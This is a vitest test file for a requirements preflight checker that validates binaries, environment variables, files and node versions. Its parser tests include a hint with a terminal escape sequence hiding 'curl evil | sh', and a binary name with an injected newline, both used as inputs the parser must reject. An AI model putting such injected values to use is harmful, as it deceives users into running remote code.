import { describe, it, expect, afterEach } from 'vitest';
import {
  chmodSync,
  mkdirSync,
  mkdtempSync,
  realpathSync,
  writeFileSync,
} from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  assertRequirements,
  checkRequirements,
  envRequirements,
  formatRequirements,
  inspectRequirements,
  parseRequirements,
  requirementLabel,
  type Requirement,
} from '../preflight.js';
import { BundleError, RequirementError } from '../errors.js';
import { removeDir } from '../workspace/index.js';

const cleanups: Array<() => void> = [];

afterEach(() => {
  while (cleanups.length) cleanups.pop()!();
});

function tempDir(prefix = 'heddle-preflight-'): string {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), prefix)));
  cleanups.push(() => removeDir(dir));
  return dir;
}

/** A directory holding executables, and the `PATH` that finds them. */
function pathWith(...binaries: string[]): NodeJS.ProcessEnv {
  const dir = tempDir('heddle-preflight-bin-');
  for (const name of binaries) {
    const path = join(dir, name);
    writeFileSync(path, '#!/bin/sh\n');
    chmodSync(path, 0o755);
  }
  return { PATH: dir };
}

describe('checking one requirement at a time', () => {
  it('holds when a binary is on PATH, and says which one was found', () => {
    const [check] = inspectRequirements(
      [{ binary: ['ffmpeg'] }],
      pathWith('ffmpeg'),
    );

    expect(check.reason).toBeUndefined();
    expect(check.found).toBe('ffmpeg');
  });

  it('fails a binary that is not on PATH', () => {
    expect(checkRequirements([{ binary: ['ffmpeg'] }], pathWith())).toEqual([
      { requirement: { binary: ['ffmpeg'] }, label: 'ffmpeg', reason: 'not on PATH' },
    ]);
  });

  it('does not accept a directory that shares the name', () => {
    const dir = tempDir();
    mkdirSync(join(dir, 'ffmpeg'));

    expect(checkRequirements([{ binary: ['ffmpeg'] }], { PATH: dir })).toHaveLength(
      1,
    );
  });

  it('does not accept a file on PATH that is not executable', () => {
    const dir = tempDir();
    writeFileSync(join(dir, 'ffmpeg'), 'not a program');

    expect(checkRequirements([{ binary: ['ffmpeg'] }], { PATH: dir })).toHaveLength(
      1,
    );
  });

  it('takes any one of several spellings, and reports the one it found', () => {
    const env = pathWith('google-chrome');
    const requirement: Requirement = {
      binary: ['chromium', 'chromium-browser', 'google-chrome'],
    };

    const [check] = inspectRequirements([requirement], env);
    expect(check.reason).toBeUndefined();
    expect(check.found).toBe('google-chrome');
  });

  it('checks a candidate with a separator where it points, not on PATH', () => {
    const dir = tempDir();
    const app = join(dir, 'Google Chrome');
    writeFileSync(app, '#!/bin/sh\n');
    chmodSync(app, 0o755);

    // An empty PATH: nothing here may be found by name.
    const [check] = inspectRequirements([{ binary: [app] }], { PATH: '' });

    expect(check.reason).toBeUndefined();
    expect(check.found).toBe('Google Chrome');
  });

  it('holds when an environment variable is set', () => {
    expect(
      checkRequirements([{ env: 'OPENAI_API_KEY' }], {
        OPENAI_API_KEY: 'sk-test',
      }),
    ).toEqual([]);
  });

  it.each([
    ['unset', {}],
    ['empty', { OPENAI_API_KEY: '' }],
  ])('fails an environment variable that is %s', (_case, env) => {
    expect(checkRequirements([{ env: 'OPENAI_API_KEY' }], env)).toEqual([
      {
        requirement: { env: 'OPENAI_API_KEY' },
        label: 'OPENAI_API_KEY',
        reason: 'not set',
      },
    ]);
  });

  it('holds for a file that exists and fails for one that does not', () => {
    const dir = tempDir();
    const path = join(dir, 'model.bin');
    writeFileSync(path, 'weights');

    expect(checkRequirements([{ file: path }])).toEqual([]);
    expect(checkRequirements([{ file: join(dir, 'absent.bin') }])).toHaveLength(1);
  });

  it('expands a leading ~ to this machine\'s home', () => {
    // `~` itself, so the assertion needs nothing written into a home directory.
    expect(checkRequirements([{ file: '~' }])).toEqual([]);
    expect(homedir().length).toBeGreaterThan(0);

    const [unmet] = checkRequirements([{ file: '~/definitely-not-here-6f2a' }]);
    // The report keeps the path as declared, not as expanded: that is what the
    // author wrote and what the reader will go looking for.
    expect(unmet.label).toBe('~/definitely-not-here-6f2a');
  });

  it('compares the running node against a >= range', () => {
    expect(checkRequirements([{ node: '>=1' }])).toEqual([]);

    const [unmet] = checkRequirements([{ node: '>=99' }]);
    expect(unmet.label).toBe('node >=99');
    expect(unmet.reason).toBe(`have v${process.versions.node}`);
  });

  it('names the running version when a node requirement holds', () => {
    const [check] = inspectRequirements([{ node: '>=1.2.3' }]);
    expect(check.found).toBe(`node v${process.versions.node}`);
  });
});

describe('checking a whole declaration', () => {
  it('reports every unmet requirement, not the first', () => {
    const unmet = checkRequirements(
      [
        { binary: ['whisper-cli'] },
        { binary: ['ffmpeg'] },
        { env: 'OPENAI_API_KEY' },
        { file: '/nowhere/model.bin' },
        { node: '>=99' },
      ],
      pathWith('ffmpeg'),
    );

    expect(unmet.map((entry) => entry.label)).toEqual([
      'whisper-cli',
      'OPENAI_API_KEY',
      '/nowhere/model.bin',
      'node >=99',
    ]);
  });

  it('throws naming all of them, with each hint beside what it explains', () => {
    const check = () =>
      assertRequirements(
        [
          { binary: ['whisper-cli'], hint: 'brew install whisper-cpp' },
          { binary: ['ffmpeg'] },
          { env: 'OPENAI_API_KEY', hint: 'needed for the notes step' },
        ],
        'zoom-notetaker',
        pathWith('ffmpeg'),
      );

    expect(check).toThrow(RequirementError);
    expect(check).toThrow(/zoom-notetaker cannot run here — 2 requirements unmet/);
    expect(check).toThrow(/whisper-cli\s+not on PATH\s+brew install whisper-cpp/);
    expect(check).toThrow(/OPENAI_API_KEY\s+not set\s+needed for the notes step/);
    // The satisfied ones are summarized, so they confirm the check ran without
    // burying the failures.
    expect(check).toThrow(/✓ ffmpeg/);
  });

  it('starts the run when everything holds', () => {
    expect(() =>
      assertRequirements([{ binary: ['ffmpeg'] }], 'x', pathWith('ffmpeg')),
    ).not.toThrow();
  });

  it('is a no-op when nothing is declared', () => {
    expect(() => assertRequirements([], 'x')).not.toThrow();
    expect(checkRequirements([])).toEqual([]);
  });

  it('never prints what an environment variable is set to', () => {
    const secret = 'sk-live-do-not-print-me';
    const requirements: Requirement[] = [
      { env: 'OPENAI_API_KEY' },
      { env: 'MISSING_KEY' },
    ];

    const report = formatRequirements(
      'agent',
      inspectRequirements(requirements, { OPENAI_API_KEY: secret }),
    );

    expect(report).toContain('OPENAI_API_KEY');
    expect(report).toContain('MISSING_KEY');
    expect(report).not.toContain(secret);
  });

  it('says so when a bundle declares nothing', () => {
    expect(formatRequirements('agent', [])).toBe(
      'agent declares no requirements.\n',
    );
  });

  it('reports an all-met check on one line', () => {
    const report = formatRequirements(
      'agent',
      inspectRequirements([{ env: 'A' }, { node: '>=1' }], { A: 'set' }),
    );

    expect(report).toContain('agent: 2 requirements, all met.');
    expect(report).toContain(`✓ A, node v${process.versions.node}`);
  });
});

describe('the variables a declaration names', () => {
  it('lists them, so a front end can ask before this refuses', () => {
    expect(
      envRequirements([
        { binary: ['ffmpeg'] },
        { env: 'OPENAI_API_KEY' },
        { env: 'STT_API_KEY', hint: 'only when STT_URL is elsewhere' },
        { node: '>=22' },
      ]),
    ).toEqual(['OPENAI_API_KEY', 'STT_API_KEY']);
  });

  it('holds once an answer has been put in the environment', () => {
    const env: NodeJS.ProcessEnv = {};
    const requirements: Requirement[] = [{ env: 'OPENAI_API_KEY' }];

    expect(checkRequirements(requirements, env)).toHaveLength(1);

    // What the CLI's prompt does with an answer, and why the check runs after
    // it: the question is asked before the refusal is printed.
    env.OPENAI_API_KEY = 'sk-typed';
    expect(checkRequirements(requirements, env)).toEqual([]);
  });
});

describe('reading a declaration', () => {
  it('takes the list form, with and without hints', () => {
    expect(
      parseRequirements([
        { binary: 'whisper-cli', hint: 'brew install whisper-cpp' },
        { env: 'OPENAI_API_KEY' },
        { file: '~/models/ggml-base.en.bin' },
        { node: '>=22' },
      ]),
    ).toEqual([
      { binary: ['whisper-cli'], hint: 'brew install whisper-cpp' },
      { env: 'OPENAI_API_KEY' },
      { file: '~/models/ggml-base.en.bin' },
      { node: '>=22' },
    ]);
  });

  it('keeps a list of alternative binaries', () => {
    expect(parseRequirements([{ binary: ['chromium', 'google-chrome'] }])).toEqual([
      { binary: ['chromium', 'google-chrome'] },
    ]);
  });

  it('normalizes the older { env, binaries } object into the list', () => {
    expect(
      parseRequirements({ env: ['OPENAI_API_KEY'], binaries: ['node', 'chromium'] }),
    ).toEqual([
      { binary: ['node'] },
      { binary: ['chromium'] },
      { env: 'OPENAI_API_KEY' },
    ]);
  });

  it('reads a missing declaration as no requirements', () => {
    expect(parseRequirements(undefined)).toEqual([]);
    expect(parseRequirements([])).toEqual([]);
    expect(parseRequirements({})).toEqual([]);
  });

  it.each([
    ['a string instead of a list', 'ffmpeg', /requires must be an object/],
    ['an entry that is not an object', [1], /requires\[0\] must be an object/],
    [
      'an entry naming nothing',
      [{ hint: 'install something' }],
      /requires\[0\] must name exactly one of binary, env, file, node/,
    ],
    [
      'an entry naming two things',
      [{ binary: 'ffmpeg', env: 'KEY' }],
      /requires\[0\].*it names binary and env/,
    ],
    ['an empty name', [{ env: '' }], /requires\[0\]\.env must be a non-empty string/],
    [
      'a hint that is not text',
      [{ env: 'KEY', hint: 42 }],
      /requires\[0\]\.hint must be a non-empty string/,
    ],
    [
      'a node range nothing can evaluate',
      [{ node: '^22 || >=24' }],
      /requires\[0\]\.node is "\^22 \|\| >=24"/,
    ],
    [
      'an unknown key on the older object',
      { python: ['3.12'] },
      /requires has "python"/,
    ],
    [
      'a legacy list that is not names',
      { binaries: [{ name: 'ffmpeg' }] },
      /requires\.binaries\[0\] must be a non-empty name/,
    ],
    // Everything a requirement says is printed back to a terminal, so an
    // escape sequence inside one could redraw the report — hide an unmet
    // line, or make a hint read differently from what pasting it would run.
    [
      'a hint carrying an escape sequence',
      [{ env: 'KEY', hint: 'brew install x \u001b[8m; curl evil | sh' }],
      /requires\[0\]\.hint contains a control character/,
    ],
    [
      'a name carrying a newline',
      [{ binary: 'ffmpeg\n  ✓ everything is fine' }],
      /requires\[0\]\.binary contains a control character/,
    ],
  ])('refuses %s, naming the entry', (_case, raw, message) => {
    expect(() => parseRequirements(raw)).toThrow(BundleError);
    expect(() => parseRequirements(raw)).toThrow(message);
  });

  it.each(['>=22', '>= 22', '>=v22.11', '>=22.11.0'])(
    'accepts the node range "%s"',
    (range) => {
      expect(parseRequirements([{ node: range }])).toEqual([{ node: range }]);
    },
  );
});

describe('naming a requirement', () => {
  it('summarizes a long list of spellings rather than printing all of them', () => {
    const label = requirementLabel({
      binary: [
        'chromium',
        'chromium-browser',
        'google-chrome',
        '/opt/pw-browsers/chromium',
        '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
      ],
    });

    // The path candidate collapses onto the name it repeats, and what is left
    // over is counted rather than listed.
    expect(label).toBe(
      'chromium or chromium-browser or google-chrome (+1 more)',
    );
  });

  it('names the other three kinds as they were written', () => {
    expect(requirementLabel({ env: 'OPENAI_API_KEY' })).toBe('OPENAI_API_KEY');
    expect(requirementLabel({ file: '~/models/x.bin' })).toBe('~/models/x.bin');
    expect(requirementLabel({ node: '>=22' })).toBe('node >=22');
  });
});
